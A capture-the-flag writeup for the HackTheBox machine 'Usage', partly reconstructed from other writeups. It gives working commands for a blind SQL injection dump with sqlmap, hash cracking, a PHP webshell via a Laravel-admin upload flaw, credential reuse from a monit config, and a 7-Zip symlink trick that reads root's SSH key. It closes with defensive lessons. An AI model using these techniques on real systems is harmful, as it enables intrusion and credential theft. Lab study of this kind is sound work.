---
title: "Usage"
date: 2024-04-06
type: docs
tags:
  - htb
  - linux
  - easy
  - sqli
  - blind-sqli
  - laravel
  - laravel-admin
  - cve-2023-24249
  - file-upload
  - monit
  - password-reuse
  - sudo
  - 7zip
  - wildcard
---

<div class="callout callout-warning">

**🚧 Work in Progress**: This writeup is marked **partial** in my notes: the attack chain below may stop short of a full root/completion.

</div>

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 22.04), **Difficulty:** Easy, **Released:** 2024-04-06, **IP:** `10.10.11.18` , `usage.htb`

</div>

<div class="callout callout-warning">

**Partial**

My own notes stop after recon, the vhost discovery, and the stored-XSS idea. The SQLi -> admin panel -> file upload -> root chain below is reconstructed from published writeups and marked.

</div>

<div class="callout callout-abstract">

**Attack Path**

1. A vhost sweep finds `admin.usage.htb`. The customer site's **password reset** form is **blind SQL injectable**. Dump the `admin_users` table, get `admin`'s bcrypt hash, crack it.
2. Log into `admin.usage.htb` (**Laravel-admin**). The profile image upload does not validate file type, **CVE-2023-24249**. Upload a PHP webshell, get a shell as **`dash`**.
3. `dash`'s `~/.monitrc` holds a password reused by **`xander`**. `su xander`.
4. `xander` may `sudo /usr/bin/usage_management`, which runs `7za` with a wildcard over `/var/www/html`. **7-Zip wildcard / list-file abuse** reads `/root/.ssh/id_rsa`. SSH in as root.

</div>

<div class="callout callout-key">

**Credentials and Flags**


| Where | Value |
| --- | --- |
| `admin` (cracked from `admin_users`) | `whatever1` |
| `xander` (`.monitrc`) | `3nc0d3d_pa$$w0rd` |
| `user.txt` | `/home/dash/user.txt` |
| `root.txt` | `/root/root.txt` |

</div>

---

## Overview

Usage is a Laravel box that walks through four separate primitives. A **blind SQL injection** in a place people forget to test (the forgot-password form), an **N-day in an admin framework** (Laravel-admin file upload, CVE-2023-24249), **password reuse from a monit config**, and a **7-Zip wildcard trick** for the final read. The 7-Zip step is the one worth memorising: when `7za` is told to add files matching a glob, an argument beginning with `@` is treated as a *list file*, and `-i@` / a bare `@name` makes it read that file and print its contents in the error output if the "file list" is not valid. Symlink `@x` style tricks turn "archive my web root" into "read any file as root".

Related blind SQLi boxes: [Jupiter](/writeups/hackthebox/linux/medium/jupiter/), [Monitored](/writeups/hackthebox/linux/medium/monitored/). Related admin-panel file upload: [Magic](/writeups/hackthebox/linux/medium/magic/), [PopCorn](/writeups/hackthebox/linux/medium/popcorn/). Related `sudo` + archive wildcard: [Stocker](/writeups/hackthebox/linux/easy/stocker/), and `tar` wildcard on other boxes.

---

## Full Walkthrough

### Reconnaissance

```console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

The site has login and registration. Fuzz for vhosts:

```bash
ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -c \
  -u http://usage.htb -H "Host: FUZZ.usage.htb" --mc all --fs 178
```

```console
admin  [Status: 200, Size: 3304, Words: 493, Lines: 89]
```

`admin.usage.htb` is a separate administration login panel (Laravel-admin branding).

### Foothold, blind SQLi in the reset form

<div class="callout callout-note">

**Blind SQLi in forgot-password (reconstructed)**

`POST /forgot-password` with `email=<x>` builds a query like `SELECT ... FROM users WHERE email = '<x>'`. Registration and login are parameterised, but this form is not. It is **boolean/time blind**: a valid injected condition changes whether the "reset link sent" message appears (or adds a `SLEEP`). Point sqlmap at the request, dbms MySQL, and dump the admin table:
```bash
sqlmap -r reset.req -p email --level 5 --risk 3 --batch --dbms mysql \
  -D usage_blog -T admin_users -C username,password --dump
```
`admin` has a `$2y$` bcrypt hash. `hashcat -m 3200` against rockyou gives `whatever1`.

</div>

Log into `admin.usage.htb` as `admin : whatever1`.

### Laravel-admin file upload, CVE-2023-24249

<div class="callout callout-note">

**CVE-2023-24249**

`encore/laravel-admin` <= 1.8.18 does not validate the type or extension of files uploaded through user/profile forms. The avatar upload on the admin's own profile page accepts a `.php` file and stores it under a predictable path (`/uploads/images/<name>.php`) served by the web server. Upload a plain PHP webshell, browse to it, and you have code execution as the web user, **`dash`**.

</div>

```bash
# profile -> avatar -> upload shell.php  (a one-liner: <?php system($_GET['c']); ?>)
curl 'http://admin.usage.htb/uploads/images/shell.php?c=id'
# then upgrade to a reverse shell as dash
```

`user.txt` is in `/home/dash`.

### dash to xander

```bash
cat ~/.monitrc
```

```
set httpd port 2812 and
    use address localhost
    allow admin:"3nc0d3d_pa$$w0rd"
```

That password is reused:

```bash
su xander        # 3nc0d3d_pa$$w0rd
```

### Privilege Escalation, 7-Zip wildcard as root

```console
xander@usage:~$ sudo -l
User xander may run the following commands on usage:
    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
```

`usage_management` is a small menu. Option 1 runs, roughly:

```bash
cd /var/www/html && /usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
```

<div class="callout callout-note">

**7-Zip list-file / wildcard read**

When `7za` expands `*` in the web root, any filename that starts with `@` is treated as a **list file**: 7-Zip opens it and reads the paths to archive from inside it. If the contents are not valid paths, 7-Zip prints them in an error like `Cannot find archive ...: <contents>`. So:
```bash
cd /var/www/html
touch @id_rsa
ln -s /root/.ssh/id_rsa id_rsa
sudo /usr/bin/usage_management        # choose the backup option
# error output prints the contents of /root/.ssh/id_rsa
```
Copy the key, `chmod 600`, and `ssh -i id_rsa root@usage.htb`.

</div>

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/dash/user.txt` |
| `root.txt` | `/root/root.txt` |

---

## Lessons and Takeaways

- **Test every form, not just login.** Password reset, search, contact, and "check availability" endpoints are where unparameterised queries hide.
- **Patch Laravel-admin** and, in general, validate upload MIME type *and* extension server side, and store uploads outside the web root or with execution disabled.
- **monit, supervisor, and app config files hold plaintext credentials.** Check `~/.monitrc`, `/etc/monit*`, `supervisord.conf` after any foothold.
- **Never run `7za`/`tar`/`rsync` with a wildcard as root** in an attacker-writable directory. Use an explicit file list, or `--` plus a fixed path, and disable `-snl`.
- **Unique passwords** between monit, `xander`, and everything else.

---

## Related Writeups

- **Blind SQL injection:** [Jupiter](/writeups/hackthebox/linux/medium/jupiter/), [Monitored](/writeups/hackthebox/linux/medium/monitored/), [PC](/writeups/hackthebox/linux/easy/pc/)
- **Admin-panel file upload to RCE:** [Magic](/writeups/hackthebox/linux/medium/magic/), [PopCorn](/writeups/hackthebox/linux/medium/popcorn/), [Nexus](/writeups/hackthebox/linux/easy/nexus/)
- **Archive wildcard abuse via `sudo`:** [Stocker](/writeups/hackthebox/linux/easy/stocker/)
- **Credentials in a service config:** [Previse](/writeups/hackthebox/linux/easy/previse/), [Wifinetic](/writeups/hackthebox/linux/easy/wifinetic/)

## References

- CVE-2023-24249 (laravel-admin) <https://github.com/z-song/laravel-admin/issues/6013>
- 7-Zip list files and switches <https://documentation.help/7-Zip/list_files.htm>
- GTFOBins 7z <https://gtfobins.github.io/gtfobins/7z/>
